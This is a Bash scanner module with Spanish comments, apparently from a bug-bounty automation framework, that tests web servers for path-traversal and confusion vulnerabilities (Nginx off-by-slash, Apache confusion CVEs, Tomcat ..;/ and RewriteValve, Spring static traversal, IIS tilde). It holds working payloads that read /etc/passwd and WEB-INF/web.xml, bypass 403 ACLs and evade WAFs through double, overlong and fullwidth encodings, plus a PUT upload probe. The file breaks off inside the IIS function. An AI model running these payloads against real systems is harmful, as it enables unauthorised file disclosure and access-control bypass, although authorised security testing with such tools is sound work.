#!/usr/bin/env bash
# ============================================================
#  modules/26_path_confusion.sh
#  Fase 26: Path Traversal y Confusion Attacks
#
#  IMPORTANTE: Cada técnica solo se lanza contra la tecnología
#  que puede tenerla. No se lanza nada contra targets que no
#  tengan la tecnología correspondiente detectada.
#
#  Técnicas implementadas:
#
#  [Nginx]
#    1. Off-by-slash (Orange Tsai — BlackHat 2018)
#       → location sin trailing slash + alias con slash
#
#    2. merge_slashes bypass via proxy_pass
#
#  [Apache httpd]
#    3. Confusion Attacks (Orange Tsai — BlackHat 2024)
#       → CVE-2024-38475/38476/38477/38473/38474/39573
#       → Filename confusion: ? bypasea ACL
#       → DocumentRoot confusion: código fuente expuesto
#
#  [Apache Tomcat]
#    4. ..;/ semicolon path confusion (CVE-2025-24813)
#       → Security checker lee /app/user/ pero Tomcat
#         procesa ..;/ como traversal
#
#    5. RewriteValve traversal (CVE-2025-55752)
#       → Normalización antes de decode bypasea WEB-INF
#
#  [Spring Framework]
#    6. Static resource path traversal (CVE-2024-38819)
#       → WebMvc.fn / WebFlux.fn con FileSystemResource
#
#  [IIS / ASP.NET]
#    7. Tilde Short-Name Enumeration (~)
#       → IIS expone nombres 8.3 via ~ en URLs
#       → GET /*~1*/ vs /zzz*~1*/ → diferencia 404/400 confirma
#       → WAF bypass: %7e en lugar de ~
#
#  [WAF Bypass Layer — todos los tests anteriores]
#    - Double URL encode: ../ → ..%252F (WAF ve literal; Apache/IIS decodifican)
#    - UTF-8 overlong: / → %c0%af
#    - Unicode fullwidth: / → %ef%bc%8f  . → %ef%bc%8e
#    - Encoded semicolon: ; → %3b, %253b
#    - Mixed case hex: %2F vs %2f
#    - Null byte suffix: path%00
#    - Dot segments: /./path, path/.
#    - Backslash: %5c (backends Windows)
#
#  Referencias:
#    Orange Tsai: https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
#    CVE-2025-24813: github.com/MuhammadWaseem29/CVE-2025-24813
#    CVE-2025-55752: github.com/TAM-K592/CVE-2025-55752
#    CVE-2024-38819: spring.io/security/cve-2024-38819
#    IIS Short-Name: github.com/irsdl/IIS-ShortName-Scanner
# ============================================================

MODULE_NAME="path_confusion"
MODULE_DESC="Path Traversal y Confusion Attacks (Orange Tsai + Tomcat + Spring + WAF bypass)"

# ══════════════════════════════════════════════════════════════
#  WAF BYPASS LAYER
#
#  Cuando un payload directo recibe 403/406/444/429, el WAF lo
#  bloqueó. Las funciones de bypass generan variantes codificadas
#  que el WAF no normaliza pero Apache/Tomcat sí procesan.
#
#  Técnicas de encoding (aprendidas en auditorías BBP reales):
#    a) Double URL encode:  ../  →  ..%252F      (WAF ve %252F literal)
#    b) UTF-8 overlong:     /    →  %c0%af       (CVE-2001-0131 clásico)
#    c) Unicode fullwidth:  .    →  %ef%bc%8e    (AWS ALB + Apache)
#    d) Mixed case hex:     %2f  →  %2F          (algunos WAFs son case-sensitive)
#    e) Null byte suffix:   path →  path%00      (Apache mod_negotiation)
#    f) Semicolon suffix:   path →  path;        (Tomcat ignora ; en path)
#    g) %09 tab en path:    /    →  %09          (algunos WAFs no normalizan tab)
#    h) Backslash:          /    →  %5c          (IIS/Windows backend)
#    i) Doble slash:        //   →  /./          (merge_slashes bypass)
#    j) Unicode superscript: ../ →  ．．/         (fullwidth dots U+FF0E)
# ══════════════════════════════════════════════════════════════

# ── Detectar si una URL está bloqueada por WAF ────────────────
_waf_blocks() {
  local STATUS="$1"
  case "$STATUS" in
    403|406|419|429|444|503) return 0 ;;
    *) return 1 ;;
  esac
}

# ── Generar variantes WAF-bypass de un path de traversal ─────
# Entrada: path con ../ en texto claro (e.g. "../../etc/passwd")
# Salida:  variantes codificadas, una por línea
_waf_traversal_variants() {
  local PLAIN="$1"

  # a) Double URL encode: cada / → %252F, cada . → %252E
  local DOUBLE
  DOUBLE=$(echo "$PLAIN" | sed 's|/|%252F|g; s|\.|%252E|g')
  echo "$DOUBLE"

  # b) UTF-8 overlong para /
  local OVERLONG
  OVERLONG=$(echo "$PLAIN" | sed 's|/|%c0%af|g')
  echo "$OVERLONG"

  # c) Unicode fullwidth dots (U+FF0E = %ef%bc%8e)
  local FULLWIDTH
  FULLWIDTH=$(echo "$PLAIN" | sed 's|\.\./|%ef%bc%8e%ef%bc%8e/|g')
  echo "$FULLWIDTH"

  # d) Mix %2F (mayúscula) para / con .. en claro
  echo "${PLAIN//\//\%2F}"

  # e) %2e%2e para ..
  echo "${PLAIN//\.\./\%2e%2e}"

  # f) Mix: ..%2F
  echo "${PLAIN//\//\%2f}"

  # g) Backslash (para backends Windows/IIS)
  echo "${PLAIN//\//\\}"
  echo "${PLAIN//\//\%5c}"

  # h) Punto + semicolon Tomcat variant
  echo "${PLAIN//\.\./\.%00.}"

  # i) Trailing null byte
  echo "${PLAIN}%00"

  # j) Double-encoded dots
  echo "${PLAIN//\.\./\%252e%252e}"
}

# ── Probar un path con bypass WAF si el directo falla ─────────
# Retorna 0 y escribe la URL que funcionó en stdout si hay bypass
_try_with_waf_bypass() {
  local BASE="$1"          # https://host
  local PLAIN_PATH="$2"    # path en texto claro con ../
  local EXPECTED_BODY="$3" # regex para confirmar que llegamos al recurso
  local PROXY="$4"

  # Primero intentar directo
  local DIRECT_URL="${BASE}${PLAIN_PATH}"
  _h_get "$DIRECT_URL" --path-as-is
  local STATUS="$HTTP_LAST_STATUS" BODY="$HTTP_LAST_BODY"

  if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qP "$EXPECTED_BODY"; then
    echo "$DIRECT_URL"
    return 0
  fi

  # Si WAF bloqueó o no encontró, probar variantes de bypass
  if _waf_blocks "$STATUS" || [[ "$STATUS" == "404" ]]; then
    while IFS= read -r ENCODED_PATH; do
      [[ -z "$ENCODED_PATH" ]] && continue
      local BYPASS_URL="${BASE}/${ENCODED_PATH#/}"
      _h_get "$BYPASS_URL" --path-as-is
      local BS="$HTTP_LAST_STATUS" BB="$HTTP_LAST_BODY"

      if [[ "$BS" == "200" ]] && echo "$BB" | grep -qP "$EXPECTED_BODY"; then
        echo "$BYPASS_URL"
        return 0
      fi
    done < <(_waf_traversal_variants "$PLAIN_PATH")
  fi

  return 1
}

# Directorios comunes en alias Nginx
NGINX_ALIAS_DIRS=(
  "static" "assets" "media" "files" "images" "img"
  "js" "css" "fonts" "upload" "uploads" "public"
  "content" "dist" "build" "resources" "storage"
  "downloads" "docs" "data" "api" "v1" "v2"
)

# ── Detectar tecnología de un subdominio ──────────────────────
_detect_server_tech() {
  local URL="$1"
  local PROXY_FLAG="$2"  # ignorado: _h_* auto-inyecta

  _h_head "$URL"
  local HEADERS="$HTTP_LAST_HEADERS"

  local SERVER
  SERVER=$(echo "$HEADERS" | grep -i "^Server:" | head -1 | tr -d '\r\n')
  local POWERED
  POWERED=$(echo "$HEADERS" | grep -i "^X-Powered-By:" | head -1 | tr -d '\r\n')

  local TECH=""

  # Nginx
  echo "$SERVER" | grep -qi "nginx" && TECH="${TECH}:nginx"

  # Apache httpd (no Tomcat)
  echo "$SERVER" | grep -qi "Apache" && \
    ! echo "$SERVER" | grep -qi "Tomcat" && \
    TECH="${TECH}:apache_httpd"

  # Tomcat — varias formas de detectarlo
  echo "$SERVER"  | grep -qi "Tomcat"   && TECH="${TECH}:tomcat"
  echo "$POWERED" | grep -qi "Tomcat"   && TECH="${TECH}:tomcat"
  echo "$HEADERS" | grep -qi "JSESSIONID\|jsessionid" && TECH="${TECH}:tomcat"

  # Spring Boot — actuator o headers específicos
  echo "$HEADERS" | grep -qi "X-Application-Context\|spring" && TECH="${TECH}:spring"
  # También detectar si hay actuator accesible
  local ACT_STATUS
  ACT_STATUS=$(_h_status "${URL}/actuator")
  [[ "$ACT_STATUS" == "200" ]] && TECH="${TECH}:spring"

  echo "$TECH"
}

# ── Detectar tech desde DB ────────────────────────────────────
_get_tech_subs() {
  local DOMAIN_ID="$1"
  local TECH_PATTERN="$2"
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND tech_name LIKE '${TECH_PATTERN}'
     UNION
     SELECT DISTINCT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive'
       AND subdomain IN (
         SELECT DISTINCT subdomain FROM technologies
         WHERE domain_id=${DOMAIN_ID}
           AND tech_name LIKE '${TECH_PATTERN}'
       );" 2>/dev/null
}

_get_alive_subs() {
  local DOMAIN_ID="$1"
  sqlite3 "$DB_PATH" \
    "SELECT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive';" 2>/dev/null
}

# ── Helper: comparar respuestas ───────────────────────────────
_responses_similar() {
  local S1="$1" L1="$2" S2="$3" L2="$4"
  [[ "$S1" != "$S2" ]] && return 1
  local DIFF=$(( L1 - L2 ))
  [[ "${DIFF#-}" -le 100 ]] && return 0
  return 1
}

# ── Helper: registrar finding ─────────────────────────────────
_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" URL="$3"
  local TYPE="$4" SEV="$5" DETAIL="$6" TEMPLATE="$7"

  db_add_finding "$DOMAIN_ID" "path_confusion" "$SEV" \
    "$URL" "$TEMPLATE" "$DETAIL"

  local EMOJI="🔴"; [[ "$SEV" == "medium" ]] && EMOJI="🟠"
  log_warn "  ⚡ [$SEV] $TYPE: $URL"

  _telegram_send "${EMOJI} *Path Confusion — ${TYPE}*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📋 ${DETAIL:0:250}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
}

# ══════════════════════════════════════════════════════════════
#  1. NGINX — Off-by-slash (Orange Tsai BlackHat 2018)
#  Solo se ejecuta si la tecnología detectada es Nginx
# ══════════════════════════════════════════════════════════════
_test_nginx_off_by_slash() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Nginx off-by-slash] $BASE"

  # Obtener respuesta de la raíz para comparar
  _h_get "${BASE}/"
  local ROOT_S="$HTTP_LAST_STATUS" ROOT_L="${#HTTP_LAST_BODY}"

  for DIR in "${NGINX_ALIAS_DIRS[@]}"; do
    # Verificar que el path base da 404 (existe pero archivo no)
    local PROBE_S
    PROBE_S=$(_h_status "${BASE}/${DIR}/hackeadora_nonexistent_8x7z")
    [[ "$PROBE_S" != "404" ]] && continue

    # Probar traversal /dir../
    _h_get "${BASE}/${DIR}../"
    local TRAV_S="$HTTP_LAST_STATUS" TRAV_L="${#HTTP_LAST_BODY}"

    if _responses_similar "$TRAV_S" "$TRAV_L" "$ROOT_S" "$ROOT_L" && \
       [[ "$TRAV_S" == "200" ]]; then
      # Confirmar con un recurso conocido
      local CONF_S
      CONF_S=$(_h_status "${BASE}/${DIR}../index.html")
      if [[ "$CONF_S" == "200" ]]; then
        _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/${DIR}../" \
          "Nginx Off-by-Slash" "high" \
          "Orange Tsai BH2018: alias traversal confirmado via /${DIR}../" \
          "nginx_off_by_slash"
      fi
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  2. NGINX — merge_slashes + proxy_pass
#  Solo se ejecuta si la tecnología detectada es Nginx
# ══════════════════════════════════════════════════════════════
_test_nginx_merge_slashes() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Nginx merge_slashes] $BASE"

  local API_PATHS
  API_PATHS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE}%'
       AND (url LIKE '%/api/%' OR url LIKE '%/v1/%' OR url LIKE '%/v2/%')
     LIMIT 8;" 2>/dev/null)

  _h_get "${BASE}/"
  local ROOT_S="$HTTP_LAST_STATUS" ROOT_L="${#HTTP_LAST_BODY}"

  while IFS= read -r API_URL; do
    [[ -z "$API_URL" ]] && continue
    local SEG
    SEG=$(echo "$API_URL" | sed 's|https\?://[^/]*||' | cut -d'/' -f2)
    [[ -z "$SEG" ]] && continue

    _h_get "${BASE}/${SEG}../" --path-as-is
    local TRAV_S="$HTTP_LAST_STATUS" TRAV_L="${#HTTP_LAST_BODY}"
    local TRAV_HASH; TRAV_HASH=$(echo "$HTTP_LAST_BODY" | md5sum | cut -d' ' -f1)

    if _responses_similar "$TRAV_S" "$TRAV_L" "$ROOT_S" "$ROOT_L" && \
       [[ "$TRAV_S" == "200" ]]; then
      # Anti-FP fix 2026-05-10: el `${SEG}../` puede normalizarse a `${SEG}/`
      # (URL canonicalization de nginx). Si body de `${SEG}/` == body de
      # `${SEG}../`, NO es traversal — es la misma página existente.
      _h_get "${BASE}/${SEG}/" --path-as-is
      local CANON_HASH; CANON_HASH=$(echo "$HTTP_LAST_BODY" | md5sum | cut -d' ' -f1)
      if [[ "$TRAV_HASH" == "$CANON_HASH" ]]; then
        # No es traversal: /es../ devuelve idéntico body que /es/
        log_info "  Skip nginx_merge_slashes /${SEG}../ — canonicalization a /${SEG}/ (mismo body)"
        continue
      fi
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/${SEG}../" \
        "Nginx merge_slashes bypass" "high" \
        "proxy_pass traversal: /${SEG}../ → raíz del backend (verificado: body distinto a /${SEG}/)" \
        "nginx_merge_slashes"
    fi
  done <<< "$API_PATHS"
}

# ══════════════════════════════════════════════════════════════
#  3. APACHE httpd — Confusion Attacks (Orange Tsai BH2024)
#  CVE-2024-38473/38474/38475/38476/38477/39573
#  Solo si tecnología es Apache httpd (NO Tomcat)
# ══════════════════════════════════════════════════════════════
_test_apache_confusion() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Apache Confusion Attacks BH2024] $BASE"

  # Nuclei con todos los CVEs de Orange Tsai 2024
  # severity en origen: solo medium/high/critical (descarta apache-detect etc.)
  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE" \
      -tags "apache,cve-2024-38475,cve-2024-38476,cve-2024-38477,cve-2024-38473,cve-2024-38474,cve-2024-39573" \
      -severity medium,high,critical \
      -silent -jsonl 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','medium'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        # Filtro de templates fingerprint/detect (Apache-detect, tech-detect, etc.)
        is_nuclei_finding_actionable "$TPL" "$SEV" || continue
        _finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
          "Apache Confusion (Orange Tsai BH2024)" "$SEV" \
          "CVE $TPL — Confusion Attack" "nuclei:$TPL"
      done
  fi

  # Test manual: ? para bypassear ACL (Filename Confusion)
  # Si el WAF devuelve 403 en el payload directo, probar variantes WAF-bypass
  for PPATH in "/admin" "/administrator" "/manager" "/.htaccess" \
               "/config" "/.env" "/server-status" "/phpinfo.php" \
               "/WEB-INF" "/META-INF" "/web.config" "/app.config"; do
    local S_NORMAL
    S_NORMAL=$(_h_status "${BASE}${PPATH}")
    [[ "$S_NORMAL" != "403" && "$S_NORMAL" != "401" ]] && continue

    # Test con ? — Filename Confusion CVE-2024-38475
    local S_Q
    S_Q=$(_h_status "${BASE}${PPATH}?")
    if [[ "$S_Q" == "200" ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PPATH}?" \
        "Apache Filename Confusion — ACL Bypass" "high" \
        "? bypasea control de acceso 403→200 en ${PPATH} (CVE-2024-38475)" \
        "apache_filename_confusion"
    fi

    # Test con # encoded
    local S_HASH
    S_HASH=$(_h_status "${BASE}${PPATH}%23" -g)
    if [[ "$S_HASH" == "200" ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PPATH}%23" \
        "Apache Filename Confusion — Hash Bypass" "high" \
        "%23 bypasea control de acceso en ${PPATH}" \
        "apache_hash_confusion"
    fi

    # ── WAF bypass layer: cuando WAF bloquea pero Apache procesa ──
    # Double-encoded path: WAF ve %2F literal, Apache lo normaliza
    local WAF_BYPASSES=(
      "${PPATH/\//\/%2f}"          # %2f (lowercase)
      "${PPATH/\//\/%2F}"          # %2F (uppercase)
      "${PPATH}%3F"                # %3F (encoded ?)
      "${PPATH}%3f"                # %3f (lowercase)
      "$(echo "$PPATH" | sed 's|/|/%ef%bc%8f|g')"   # Unicode fullwidth slash
      "$(echo "$PPATH" | sed 's|/|/./|g')"           # /./path (dot segment)
      "${PPATH}/."                 # trailing dot segment
    )
    for WB in "${WAF_BYPASSES[@]}"; do
      [[ -z "$WB" || "$WB" == "$PPATH" ]] && continue
      local WBS
      WBS=$(_h_status "${BASE}${WB}" -g)
      if [[ "$WBS" == "200" ]]; then
        _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${WB}" \
          "Apache ACL Bypass — WAF Encoding Bypass" "high" \
          "WAF bloqueó ${PPATH} (403) pero ${WB} bypasea filtro WAF → Apache procesa path sin ACL" \
          "apache_waf_encoding_bypass"
        break
      fi
    done
  done

  # DocumentRoot Confusion — exposición de código fuente PHP
  for TEST in "/index.php%3F" "/index.php%3F.txt" "/config.php%3F" \
              "/index.php%252F" "/index.php%2F.txt"; do
    _h_get "${BASE}${TEST}" -g
    local S_SRC="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:200}"

    if [[ "$S_SRC" == "200" ]] && \
       echo "$BODY" | grep -qP '<\?php|<\?=|mysql_|PDO::|\$_GET|\$_POST'; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${TEST}" \
        "Apache DocumentRoot Confusion — PHP Source" "critical" \
        "Código fuente PHP expuesto via DocumentRoot confusion: ${TEST}" \
        "apache_docroot_confusion"
    fi
  done

  # ── Double-encoded traversal (%252F) ──────────────────────────
  # WAF no detecta %25 como %; Apache/Tomcat decodifican dos veces
  # Esto activa unhandled exceptions en algunas implementaciones
  local DOUBLE_ENC_PATHS=(
    "/%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    "/..%252F..%252Fetc%252Fpasswd"
    "/..%252f..%252fetc%252fpasswd"
  )
  for DE_PATH in "${DOUBLE_ENC_PATHS[@]}"; do
    _h_get "${BASE}${DE_PATH}" --path-as-is
    local DE_S="$HTTP_LAST_STATUS" DE_B="${HTTP_LAST_BODY:0:100}"
    if [[ "$DE_S" == "200" ]] && echo "$DE_B" | grep -qP 'root:x:|daemon:|nobody:'; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${DE_PATH}" \
        "Apache Double-Encoded Traversal" "critical" \
        "%252F (double URL encode) bypasea WAF + Apache normaliza → /etc/passwd leído" \
        "apache_double_encoded_traversal"
    fi
    # También flag 500 como informational (evidencia de double-decode vulnerabilidad)
    if [[ "$DE_S" == "500" ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${DE_PATH}" \
        "Apache Double-Encoded Path — Internal Error" "low" \
        "Double-encoded %252F llega al app layer (WAF no filtra) y provoca excepción — confirma decode doble" \
        "apache_double_encode_500"
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  4. TOMCAT — ..;/ semicolon path confusion (CVE-2025-24813)
#  El security checker ve /app/user/ pero Tomcat resuelve ..;/
#  Solo si tecnología es Tomcat
# ══════════════════════════════════════════════════════════════
_test_tomcat_semicolon() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Tomcat ..;/ semicolon confusion CVE-2025-24813] $BASE"

  # Obtener rutas de la aplicación para construir payloads
  local APP_PATHS
  APP_PATHS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE}%'
     LIMIT 20;" 2>/dev/null | \
    sed "s|${BASE}||" | grep -oP '^/[^?#]+' | \
    awk -F'/' 'NF>=3 {print $0}' | sort -u | head -10)

  # Paths protegidos típicos de Tomcat
  local PROTECTED=(
    "/WEB-INF/web.xml"
    "/META-INF/MANIFEST.MF"
    "/WEB-INF/classes/"
    "/admin/"
    "/manager/"
    "/host-manager/"
  )

  for PPATH in "${PROTECTED[@]}"; do
    # Status normal (debería ser 403/404)
    local S_NORMAL
    S_NORMAL=$(_h_status "${BASE}${PPATH}")
    [[ "$S_NORMAL" != "403" && "$S_NORMAL" != "404" ]] && continue

    # Construir payload ..;/ usando rutas de la app
    # Patrón: /app/user/..;/WEB-INF/web.xml
    while IFS= read -r APP_PATH; do
      [[ -z "$APP_PATH" ]] && continue
      local SEG
      SEG=$(echo "$APP_PATH" | cut -d'/' -f1-2)
      [[ -z "$SEG" ]] && continue

      local PAYLOAD="${SEG}/..;${PPATH}"
      _h_get "${BASE}${PAYLOAD}" -g
      local S_TRAV="$HTTP_LAST_STATUS" BODY_TRAV="${HTTP_LAST_BODY:0:500}"

      if [[ "$S_TRAV" == "200" ]]; then
        local CONFIRM=false
        # Verificar que realmente obtuvimos el archivo protegido
        echo "$PPATH" | grep -q "web.xml" && \
          echo "$BODY_TRAV" | grep -qi "web-app\|servlet\|<web-app" && \
          CONFIRM=true
        echo "$PPATH" | grep -q "MANIFEST" && \
          echo "$BODY_TRAV" | grep -qi "Manifest-Version\|Main-Class" && \
          CONFIRM=true

        if $CONFIRM; then
          _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PAYLOAD}" \
            "Tomcat ..;/ Path Confusion" "critical" \
            "CVE-2025-24813: ..;/ bypasea security checker → ${PPATH} expuesto" \
            "tomcat_semicolon_traversal"
        fi
      fi
    done <<< "$APP_PATHS"
  done

  # También probar patrones directos estándar de Tomcat
  # Con variantes WAF-bypass para cada uno
  local DIRECT_PAYLOADS=(
    "/..;/WEB-INF/web.xml"
    "/..;/META-INF/"
    "/app/..;/WEB-INF/web.xml"
    "/api/..;/WEB-INF/web.xml"
    # WAF bypass: semicolon encoded → WAF no detecta ..;/ pero Tomcat procesa
    "/..%3b/WEB-INF/web.xml"
    "/app/..%3b/WEB-INF/web.xml"
    # Double-encoded semicolon
    "/..%253b/WEB-INF/web.xml"
    # Semicolon + double-encoded slash
    "/..;%2fWEB-INF%2fweb.xml"
    "/..;%252fWEB-INF%252fweb.xml"
    # Unicode semicolon (U+FF1B = %ef%bc%9b)
    "/..%ef%bc%9b/WEB-INF/web.xml"
  )
  for PAYLOAD in "${DIRECT_PAYLOADS[@]}"; do
    _h_get "${BASE}${PAYLOAD}" -g
    local S_D="$HTTP_LAST_STATUS" BODY_D="${HTTP_LAST_BODY:0:200}"

    if [[ "$S_D" == "200" ]] && \
       echo "$BODY_D" | grep -qi "web-app\|servlet\|Manifest-Version"; then
      local TMPL="tomcat_semicolon_direct"
      echo "$PAYLOAD" | grep -q '%' && TMPL="tomcat_semicolon_waf_bypass"
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PAYLOAD}" \
        "Tomcat ..;/ Path Confusion" "critical" \
        "Acceso a archivo protegido via ..;/ (encoding: ${PAYLOAD})" \
        "$TMPL"
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  5. TOMCAT — RewriteValve traversal (CVE-2025-55752)
#  Normalización antes de decode bypasea WEB-INF/META-INF
#  Solo si tecnología es Tomcat
# ══════════════════════════════════════════════════════════════
_test_tomcat_rewrite_traversal() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Tomcat RewriteValve CVE-2025-55752] $BASE"

  # Nuclei con CVE-2025-55752 y CVE-2025-24813
  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE" \
      -tags "tomcat,cve-2025-55752,cve-2025-24813" \
      -silent -jsonl 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','high'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        _finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
          "Tomcat RewriteValve Traversal" "$SEV" \
          "CVE-2025-55752: normalización antes de decode → bypass WEB-INF" \
          "nuclei:$TPL"
      done
  fi

  # Test manual: query param rewrite → WEB-INF bypass
  # Patrón: /foo?bar=../WEB-INF/web.xml
  local REWRITE_PAYLOADS=(
    "?path=../WEB-INF/web.xml"
    "?file=../WEB-INF/web.xml"
    "?resource=..%2FWEB-INF%2Fweb.xml"
    "?q=%2e%2e%2fWEB-INF%2fweb.xml"
  )

  # Obtener URLs base de la app
  local APP_BASES
  APP_BASES=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE}%'
       AND url LIKE '%?%'
     LIMIT 5;" 2>/dev/null | sed 's|?.*||')

  while IFS= read -r APP_BASE; do
    [[ -z "$APP_BASE" ]] && continue
    for QPAYLOAD in "${REWRITE_PAYLOADS[@]}"; do
      _h_get "${APP_BASE}${QPAYLOAD}" -g
      local S_R="$HTTP_LAST_STATUS" BODY_R="${HTTP_LAST_BODY:0:200}"

      if [[ "$S_R" == "200" ]] && \
         echo "$BODY_R" | grep -qi "web-app\|servlet"; then
        _finding "$DOMAIN_ID" "$DOMAIN" "${APP_BASE}${QPAYLOAD}" \
          "Tomcat RewriteValve — WEB-INF bypass" "critical" \
          "CVE-2025-55752: query param rewrite → WEB-INF/web.xml expuesto" \
          "tomcat_rewrite_traversal"
      fi
    done
  done <<< "$APP_BASES"

  # También verificar si PUT está habilitado (escala a RCE)
  _h_method "PUT" "${BASE}/hackeadora_put_test_$$" --data "test"
  local PUT_S="$HTTP_LAST_STATUS"
  if [[ "$PUT_S" == "201" || "$PUT_S" == "200" ]]; then
    _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
      "Tomcat HTTP PUT habilitado" "high" \
      "PUT habilitado — combinado con CVE-2025-55752 puede llevar a RCE" \
      "tomcat_put_enabled"
    # Limpiar el archivo de test
    _h_method "DELETE" "${BASE}/hackeadora_put_test_$$" 2>/dev/null || true
  fi
}

# ══════════════════════════════════════════════════════════════
#  6. SPRING FRAMEWORK — Static resource path traversal
#  CVE-2024-38819 — WebMvc.fn / WebFlux.fn + FileSystemResource
#  Solo si tecnología es Spring Boot/Framework
# ══════════════════════════════════════════════════════════════
_test_spring_traversal() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Spring CVE-2024-38819 path traversal] $BASE"

  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE" \
      -tags "spring,cve-2024-38819,cve-2024-38816" \
      -silent -jsonl 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','high'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        _finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
          "Spring Framework Path Traversal" "$SEV" \
          "CVE-2024-38819: WebMvc.fn/WebFlux.fn con FileSystemResource" \
          "nuclei:$TPL"
      done
  fi

  # Test manual sobre rutas estáticas de Spring
  local SPRING_PAYLOADS=(
    "/static/../../../etc/passwd"
    "/resources/..%2F..%2F..%2Fetc%2Fpasswd"
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "/webjars/../../../etc/passwd"
  )
  for PAYLOAD in "${SPRING_PAYLOADS[@]}"; do
    _h_get "${BASE}${PAYLOAD}" -g
    local S_SP="$HTTP_LAST_STATUS" BODY_SP="${HTTP_LAST_BODY:0:100}"

    if [[ "$S_SP" == "200" ]] && \
       echo "$BODY_SP" | grep -qP 'root:x:|daemon:|nobody:'; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PAYLOAD}" \
        "Spring Path Traversal — /etc/passwd" "critical" \
        "CVE-2024-38819: /etc/passwd accesible via static resource traversal" \
        "spring_path_traversal"
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  7. IIS — Tilde Short-Name Enumeration (~)
#  IIS expone nombres 8.3 de archivos/directorios a través del
#  carácter ~ en la URL. Permite enumerar archivos que no se
#  conocen incluso cuando el listado de directorio está off.
#
#  Técnica:
#    GET /a~1*/            → 404 si hay algo que empieza por 'a'
#                           → 400 si no hay nada que empieza por 'a'
#  Con esto se pueden bruteforcear nombres de archivos carácter
#  a carácter. Herramienta: IIS-ShortName-Scanner
#
#  También: ~1 en paths de archivos conocidos expone el nombre real
#    /a~1.asp  → puede servir el archivo real si la ACL es incorrecta
# ══════════════════════════════════════════════════════════════
_test_iis_tilde() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [IIS tilde short-name] $BASE"

  # Verificar que IIS está presente
  _h_head "${BASE}/"
  local HEADERS="$HTTP_LAST_HEADERS"
  echo "$HEADERS" | grep -qi "^Server:.*IIS\|^X-Powered-By:.*ASP" || return

